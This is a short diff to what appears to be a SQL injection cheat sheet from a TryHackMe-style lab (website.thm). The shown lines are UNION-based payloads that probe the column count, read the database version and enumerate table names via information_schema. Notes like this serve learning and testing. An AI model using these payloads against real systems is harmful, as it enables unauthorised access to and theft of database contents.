@@ -20,4 +20,5 @@ https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM 
 
 1 UNION SELECT @@VERSION, @@VERSION, @@VERSION, @@VERSION
 1 UNION SELECT NULL, NULL, NULL, NULL
+1 UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables
 ```
